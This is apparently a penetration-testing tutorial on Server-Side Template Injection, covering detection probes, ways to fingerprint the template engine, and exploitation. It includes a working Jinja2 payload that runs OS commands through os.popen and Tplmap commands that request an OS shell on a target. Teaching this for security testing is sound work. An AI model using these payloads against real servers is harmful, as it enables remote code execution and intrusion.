
# Server-Side Template Injection (SSTI) Guide

---

## Overview

Server-Side Template Injection (SSTI) occurs when user-controlled input is embedded directly into a server-side template and gets evaluated as code. This vulnerability can lead to a wide range of attacks, including information disclosure, arbitrary file access, and even remote code execution (RCE).

---

## Constructing a Server-Side Template Injection Attack

<img width="305" height="320" alt="image" src="https://github.com/user-attachments/assets/0a2d1b29-4dde-407c-8eca-f0c1871db652" />

### Detection Phase

#### 1. Look for User Input Reflection

Begin by identifying input fields or parameters where user input is reflected in the server response. These can be found using manual testing or tools such as Burp Suite.

#### 2. Use Fuzzing with Polyglot Payloads

To detect the vulnerability, use a **polyglot payload** composed of characters used in various template engines. For example:

```bash
POST /some-endpoint HTTP/1.1
Host: vulnerable-website.com
parameter=${{<%[%'"}}%\.
```

This payload includes special characters (`${{<%[%'"}}%.\`) commonly interpreted by template engines. If any of these trigger a response change or an error, it could indicate SSTI.

#### 3. Observe Differences in Responses

Look for:

* Evaluation of expressions like `${7*7}`
* Error messages indicating parsing issues
* Missing or malformed output
* Stack traces or exception messages revealing the engine

---

### Syntax Testing: Identify Template Context

#### A. Plaintext Context (Simple Reflection)

If user input is rendered directly, test with mathematical operations:

```text
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```

If the output shows a computed result (e.g., `49`), evaluation is confirmed.

#### B. Code Context (Expression Injection)

When user input is inserted into a running template context:

```python
engine.render("Hello {{"+greeting+"}}", data)
```

Test inputs such as:

```bash
/greeting=data.username
/greeting=data.username}}hello
```

If closing the expression (`}}`) completes the output or triggers errors, SSTI is likely.

---

### Identification Phase

Once SSTI is confirmed, identify the **template engine** to craft engine-specific payloads.

#### 1. Observe Errors for Engine Name

Inject known malformed expressions:

```text
${}
{{}}
<%= %>
${foobar}
{{foobar}}
<%= foobar %>
${7/0}
{{7/0}}
<%= 7/0 %>
```

These may generate verbose stack traces or error messages revealing the engine in use.

The following cheat sheet can be used to identify the template engine in use:


<img width="640" height="386" alt="image" src="https://github.com/user-attachments/assets/c46bb395-99da-4871-954a-69e38b54356a" />



#### 2. Use Known Engine Syntax to Test


To identify the template engine, read the error message:

<img width="820" height="71" alt="image" src="https://github.com/user-attachments/assets/7a622a4f-f19a-453f-8695-827687bb3225" />

If the error message is not displaying the template engine, we can test via known syntaxes for the popular template engines:

Try the following syntaxes and check if they are evaluated:

```text
=${7*3}
={{7*3}}
=<%= 7*3 %>
```

If a specific syntax returns `21`, you’ve identified the engine's syntax.

---

### Exploitation Phase

#### Step 1: Read the Documentation

Study official docs or HackTricks for:

* Built-in variables and filters
* Default objects
* Security limitations and bypasses
* Examples of remote execution or file access

#### Step 2: Explore Available Objects

Try accessing built-in objects like:

* `self`, `request`, `session`, `env`, `config`, `os`, etc.

If `self` or similar objects aren't available, use brute-force techniques with **SecLists** and **Burp Intruder**:

* Wordlists of variable names gathered from PHP, Python, and Java applications
* Test for object attributes like `__class__`, `__mro__`, `__subclasses__`

#### Step 3: Exploit

Based on the engine, use appropriate payloads to:

* Execute OS commands
* Read/write files
* Access sensitive variables
* Trigger privilege escalation or lateral movement

Example (Jinja2):

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

### Tools

#### Tplmap

Tplmap automates detection and exploitation of SSTI.

```bash
python2.7 tplmap.py -u 'http://target.com/page?name=John*' --os-shell
python2.7 tplmap.py -u "http://target.com/page?user=*&comment=hello"
python2.7 tplmap.py -u "http://target.com/ti?user=InjectHere*&comment=A" --level 5 -e jade
```

---

## Summary: SSTI Exploitation Flow

```text
1. Look for user input reflection
2. Inject polyglot payload: ${{<%[%'"}}%\.
3. Test evaluation: {{7*7}}, ${7*7}, <%= 7*7 %>
4. Identify errors or calculated output
5. Determine template engine based on syntax or error
6. Explore accessible objects using brute-force if needed
7. Exploit: Execute commands, read files, escalate privileges
```

---

## References

* [HackTricks SSTI Guide or cheatsheet](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
* [A Pentester’s Guide to SSTI – Meduim](https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68)
* [OWASP Template Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Template_Injection_Cheat_Sheet.html)
* [Tplmap GitHub Tool](https://github.com/epinna/tplmap)

---

